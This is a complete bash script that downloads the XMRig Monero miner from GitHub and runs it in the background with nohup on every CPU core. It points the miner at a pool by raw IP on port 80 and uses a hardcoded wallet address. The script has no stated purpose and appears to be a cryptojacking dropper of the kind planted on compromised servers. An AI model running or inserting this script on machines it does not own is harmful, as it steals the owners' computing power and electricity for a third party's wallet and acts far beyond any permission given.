#!/bin/bash
wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
tar xf xmrig-6.22.2-linux-static-x64.tar.gz
cd xmrig-6.22.2
nohup ./xmrig --donate-level 1 -a rx/0 -o 146.190.135.107:80 -u 87ZKYmmCQmXGzu1AZkxmgM9wdqwk5YtBDQ6ZGouBam1584jKUvDrC7ccANX8N7M7sGRnR9Fu18gDdTQCVVo3U2m9KYhNNsR -p Sage -t $(nproc --all)
